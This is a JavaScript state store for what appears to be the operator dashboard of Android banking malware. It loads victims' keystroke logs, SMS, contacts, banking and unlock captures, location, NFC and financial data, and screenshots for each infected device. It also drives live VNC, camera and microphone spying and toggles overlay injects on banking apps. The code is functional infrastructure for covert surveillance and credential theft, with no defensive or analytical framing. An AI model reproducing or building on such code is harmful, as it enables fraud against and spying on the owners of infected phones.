import { create } from 'zustand';

const useStore = create((set, get) => ({
  // Connection
  connected: false,
  latency:   0,
  stats:     {},

  // Devices
  devices:   [],
  onlineIds: new Set(),

  // Selected device
  selectedId:     null,
  deviceDetail:   null,
  deviceApps:     [],
  deviceKeylogs:  [],
  deviceSms:      [],
  deviceContacts: [],
  deviceBanking:  [],
  deviceUnlocks:  [],
  deviceLocation: [],
  devicePlugins:  [],
  deviceNfc:      null,
  deviceCmds:     [],
  deviceFinancial:[],
  deviceInjects:  [],
  deviceScreenshots: [],

  // Stream state
  vncActive:    false,
  cameraActive: false,
  micActive:    false,
  vncFps:       0,
  vncLatency:   0,

  // Tab
  tab: 'overview',

  // Event log
  events: [],

  // ── Actions ──────────────────────────────────────────────────────────────────
  setConnected: (v)      => set({ connected: v }),
  setLatency:   (v)      => set({ latency: v }),
  setStats:     (s)      => set({ stats: s }),
  setTab:       (t)      => set({ tab: t }),
  setDevices:   (devices)=> set({ devices }),
  setOnlineIds: (ids)    => set({ onlineIds: new Set(ids) }),
  setVncActive: (v)      => set({ vncActive: v }),
  setCameraActive: (v)   => set({ cameraActive: v }),
  setMicActive: (v)      => set({ micActive: v }),
  setVncStats:  (fps, lat)=> set({ vncFps: fps, vncLatency: lat }),

  markOnline: (id) => set(s => ({ onlineIds: new Set([...s.onlineIds, id]) })),
  markOffline: (id) => set(s => {
    const next = new Set(s.onlineIds);
    next.delete(id);
    return { onlineIds: next };
  }),

  upsertDevice: (data) => set(s => {
    const idx = s.devices.findIndex(d => d.device_id === data.device_id);
    if (idx === -1) return { devices: [...s.devices, data] };
    const next = [...s.devices];
    next[idx] = { ...next[idx], ...data };
    return { devices: next };
  }),

  updateDeviceField: (id, fields) => set(s => {
    // Remove undefined values from fields before merging
    const clean = Object.fromEntries(Object.entries(fields).filter(([, v]) => v !== undefined));
    const devices = s.devices.map(d => d.device_id === id ? { ...d, ...clean } : d);
    const deviceDetail = s.deviceDetail?.device_id === id
      ? { ...s.deviceDetail, ...clean } : s.deviceDetail;
    return { devices, deviceDetail };
  }),

  // FIX BUG 4 & 10: guard against null, reset all device data on clear
  selectDevice: async (id) => {
    // Clearing selection
    if (!id) {
      set({
        selectedId: null, deviceDetail: null,
        deviceApps: [], deviceKeylogs: [], deviceSms: [], deviceContacts: [],
        deviceBanking: [], deviceUnlocks: [], deviceLocation: [], devicePlugins: [],
        deviceNfc: null, deviceCmds: [], deviceFinancial: [], deviceInjects: [],
        deviceScreenshots: [], vncActive: false, cameraActive: false, micActive: false,
      });
      return;
    }

    set({
      selectedId: id, deviceDetail: null,
      deviceApps: [], deviceKeylogs: [], deviceSms: [], deviceContacts: [],
    });

    try {
      const [detail, apps, keylogs, sms, contacts, banking, unlocks,
             location, plugins, nfc, financial, injects, screenshots] = await Promise.all([
        fetch(`/api/devices/${id}`).then(r => r.ok ? r.json() : null).catch(() => null),
        fetch(`/api/devices/${id}/apps`).then(r => r.json()).catch(() => []),
        fetch(`/api/devices/${id}/keylogs?limit=100`).then(r => r.json()).catch(() => []),
        fetch(`/api/devices/${id}/sms`).then(r => r.json()).catch(() => []),
        fetch(`/api/devices/${id}/contacts`).then(r => r.json()).catch(() => []),
        fetch(`/api/devices/${id}/banking`).then(r => r.json()).catch(() => []),
        fetch(`/api/devices/${id}/unlocks`).then(r => r.json()).catch(() => []),
        fetch(`/api/devices/${id}/location`).then(r => r.json()).catch(() => []),
        fetch(`/api/devices/${id}/plugins`).then(r => r.json()).catch(() => []),
        fetch(`/api/devices/${id}/nfc/last`).then(r => r.json()).catch(() => null),
        fetch(`/api/devices/${id}/financial`).then(r => r.json()).catch(() => []),
        fetch(`/api/devices/${id}/injects`).then(r => r.json()).catch(() => []),
        fetch(`/api/devices/${id}/screenshots`).then(r => r.json()).catch(() => []),
      ]);
      // Only update if this device is still selected
      if (get().selectedId !== id) return;
      set({
        deviceDetail: detail, deviceApps: apps, deviceKeylogs: keylogs,
        deviceSms: sms, deviceContacts: contacts, deviceBanking: banking,
        deviceUnlocks: unlocks, deviceLocation: location, devicePlugins: plugins,
        deviceNfc: nfc, deviceFinancial: financial, deviceInjects: injects,
        deviceScreenshots: screenshots,
      });
    } catch (e) {
      console.error('selectDevice fetch error:', e);
    }
  },

  // Refresh helpers — guard against no selection
  refreshApps: async () => {
    const id = get().selectedId; if (!id) return;
    const apps = await fetch(`/api/devices/${id}/apps`).then(r => r.json()).catch(() => []);
    if (get().selectedId === id) set({ deviceApps: apps });
  },
  refreshSms: async () => {
    const id = get().selectedId; if (!id) return;
    const sms = await fetch(`/api/devices/${id}/sms`).then(r => r.json()).catch(() => []);
    if (get().selectedId === id) set({ deviceSms: sms });
  },
  refreshContacts: async () => {
    const id = get().selectedId; if (!id) return;
    const contacts = await fetch(`/api/devices/${id}/contacts`).then(r => r.json()).catch(() => []);
    if (get().selectedId === id) set({ deviceContacts: contacts });
  },
  refreshBanking: async () => {
    const id = get().selectedId; if (!id) return;
    const [banking, unlocks, injects] = await Promise.all([
      fetch(`/api/devices/${id}/banking`).then(r => r.json()).catch(() => []),
      fetch(`/api/devices/${id}/unlocks`).then(r => r.json()).catch(() => []),
      fetch(`/api/devices/${id}/injects`).then(r => r.json()).catch(() => []),
    ]);
    if (get().selectedId === id) set({ deviceBanking: banking, deviceUnlocks: unlocks, deviceInjects: injects });
  },
  refreshCmds: async () => {
    const id = get().selectedId; if (!id) return;
    const cmds = await fetch(`/api/devices/${id}/commands?limit=50`).then(r => r.json()).catch(() => []);
    if (get().selectedId === id) set({ deviceCmds: cmds });
  },

  appendKeylog: (entry) => set(s => ({
    deviceKeylogs: [entry, ...s.deviceKeylogs].slice(0, 500),
  })),

  setInjectActive: (pkg, enabled) => set(s => ({
    deviceApps: s.deviceApps.map(a =>
      a.package_name === pkg ? { ...a, inject_active: enabled ? 1 : 0 } : a
    ),
  })),

  pushEvent: (ev) => set(s => ({ events: [ev, ...s.events].slice(0, 300) })),
}));

export default useStore;
